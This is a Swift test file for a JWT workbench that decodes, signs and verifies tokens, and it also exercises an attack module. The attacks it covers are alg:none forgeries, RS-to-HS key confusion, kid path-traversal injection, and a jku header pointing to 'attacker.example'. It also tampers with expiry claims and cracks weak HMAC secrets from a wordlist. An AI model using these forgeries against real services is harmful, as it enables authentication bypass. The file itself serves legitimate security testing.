import Foundation
import Testing

@testable import GulpCodec

// F12 §2.3 / ADV-010…ADV-012: the JWT Workbench core.

@Suite("GulpCodec — JWT Workbench (ADV-010…ADV-012)")
struct JWTTests {
    static let sample = try! JWT(
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    )

    @Test("ADV-010: decode, verify the jwt.io sample (secret your-256-bit-secret), edit claims and re-sign")
    func test_ADV010_decodeVerifyResign() throws {
        #expect(Self.sample.algorithm == "HS256" && Self.sample.claims["name"] as? String == "John Doe")
        #expect(Self.sample.verifies(with: .secret(Array("your-256-bit-secret".utf8))))
        #expect(!Self.sample.verifies(with: .secret(Array("wrong".utf8))))
        let edited = try Self.sample.withClaims(["name": "Mallory", "admin": true])
        #expect(edited.headerSegment == Self.sample.headerSegment)  // untouched parts keep their bytes
        let resigned = try edited.signed("HS256", key: .secret(Array("your-256-bit-secret".utf8)))
        #expect(resigned.verifies(with: .secret(Array("your-256-bit-secret".utf8))))
        #expect(try JWT("Bearer " + resigned.compact).claims["admin"] as? Bool == true)
        let display = String(decoding: try JWT.decodeForDisplay(Self.sample.compact), as: UTF8.self)
        #expect(display.contains("\"alg\" : \"HS256\"") || display.contains("\"alg\": \"HS256\""))
        #expect(throws: CodecError.self) { try JWT("not.a-jwt") }
    }

    @Test("ADV-010/012: every algorithm signs and verifies; keys round-trip through PEM and JWK")
    func test_ADV012_algorithms() throws {
        let rsa = try JWTKey.generate(for: "RS256")
        for algorithm in [
            "HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "PS256", "PS512", "ES256", "ES384", "ES512",
        ] {
            let key =
                algorithm.hasPrefix("RS") || algorithm.hasPrefix("PS")
                ? rsa : try JWTKey.generate(for: algorithm)
            let token = try Self.sample.signed(algorithm, key: key)
            #expect(token.algorithm == algorithm)
            #expect(token.verifies(with: key.publicKey), "\(algorithm)")
            let tampered = try token.withClaims(["x": 1])
            #expect(!tampered.verifies(with: key.publicKey), "\(algorithm) tampered")
            if let pem = key.publicPEM {
                #expect(JWTKey.pem(pem).map { token.verifies(with: $0) } == true, "\(algorithm) via PEM")
            }
            let jwk = try key.publicJWK(kid: "k1")
            #expect(jwk["kid"] as? String == "k1")
            #expect(token.verifies(with: try JWTKey.jwk(jwk)), "\(algorithm) via JWK")
        }
        if let pem = rsa.privatePEM, case .rsaPrivate = JWTKey.pem(pem) {
        } else {
            Issue.record("RSA private PEM")
        }
        let jwks = Data(
            #"{"keys": [\#(String(decoding: try JSONSerialization.data(withJSONObject: try rsa.publicJWK(kid: "a")), as: UTF8.self)), {"kty": "nope"}]}"#
                .utf8)
        let keys = try JWTKey.jwks(jwks)
        #expect(keys.count == 1 && keys[0].kid == "a")
        #expect(try Self.sample.signed("RS256", key: rsa).verifies(with: keys[0].key))
        // Wrong key types never verify.
        #expect(!(try Self.sample.signed("RS256", key: rsa)).verifies(with: .secret([1, 2, 3])))
    }

    @Test("ADV-011: alg:none variants, RS→HS confusion, kid/jku injection and time claims")
    func test_ADV011_attacks() throws {
        let rsa = try JWTKey.generate(for: "RS256")
        let token = try Self.sample.signed("RS256", key: rsa)
        let none = try JWTAttacks.algNone(token)
        #expect(none.map(\.label).first == "alg:none (\"none\")" && none.count == 4)
        #expect(none.allSatisfy { $0.token.hasSuffix(".") && (try? JWT($0.token).signature.isEmpty) == true })
        let pem = try #require(rsa.publicPEM)
        let confusion = try JWTAttacks.keyConfusion(token, publicKeyPEM: pem)
        #expect(confusion.count == 2)
        // A server that verifies "HS256" with the PEM it would use for RS256 accepts one of them.
        let accepted = confusion.contains { forgery in
            (try? JWT(forgery.token)).map {
                $0.algorithm == "HS256" && $0.verifies(with: .secret(Array(pem.utf8)))
            } == true
        }
        #expect(accepted)
        let kid = try JWTAttacks.kidInjection(token)
        let kidToken = try JWT(kid.token)
        #expect(
            kidToken.header["kid"] as? String == "../../../../../../dev/null"
                && kidToken.verifies(with: .secret([])))
        let attacker = try JWTKey.generate(for: "RS256")
        let jku = try JWTAttacks.keyURLInjection(
            token, url: "https://attacker.example/jwks.json", key: attacker)
        #expect(try JWT(jku.token).header["jku"] as? String == "https://attacker.example/jwks.json")
        #expect(try JWT(jku.token).verifies(with: attacker.publicKey))
        let times = try JWTAttacks.timeClaims(try token.withClaims(["exp": 1]))
        #expect((try JWT(times[0].token).claims["exp"] as? Int ?? 0) > 1_900_000_000)
        #expect(try JWT(times[1].token).claims["exp"] == nil)
    }

    @Test("ADV-011: a weak HMAC secret is brute-forced from a wordlist")
    func test_ADV011_crack() throws {
        let words = ["123456", "password", "letmein", "secret123", "admin"]
        let weak = try Self.sample.signed("HS256", key: .secret(Array("secret123".utf8)))
        #expect(JWTAttacks.crack(weak, wordlist: words) == "secret123")
        #expect(JWTAttacks.crack(Self.sample, wordlist: words) == nil)
        #expect(
            JWTAttacks.crack(
                try Self.sample.signed("HS512", key: .secret(Array("admin".utf8))), wordlist: words)
                == "admin")
    }
}
